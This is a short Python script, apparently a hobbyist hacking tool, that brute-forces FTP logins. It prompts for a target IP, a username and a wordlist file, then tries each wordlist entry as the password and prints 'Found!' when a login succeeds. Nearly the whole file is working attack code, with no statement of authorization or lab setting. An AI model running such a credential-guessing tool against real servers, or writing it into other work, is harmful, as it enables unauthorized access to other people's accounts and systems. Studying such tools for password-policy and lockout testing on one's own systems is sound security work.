#import argparse
import sys
from ftplib import FTP
from pathlib import Path


#parser = argparse.ArgumentParser()
#parser.add_argument("-t", "--target")
#parser.add_argument("-u", "--username")
#parser.add_argument("-w", "--wordlist")

#args = parser.parse_args()

#user = args.username
#wordlist = args.wordlist
#target = args.target

def login(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print ("\n Found!")
    except:
        pass

def bruteForce(target, username, wordlist):
    try:
        wordlist = open(wordlist, "r")
        words = wordlist.readlines()
        for word in words:
            word = word.strip()
            login(target, username, word)
    except:
        print("\n There is no wordlist")
        sys.exit(0)

target = input('Enter IP Target > ')
user = input('Enter Username > ')
wordlist = Path(input('Enter path to wordlist file > '))

bruteForce(target, user, wordlist)
print("\nBrute Force Finished")


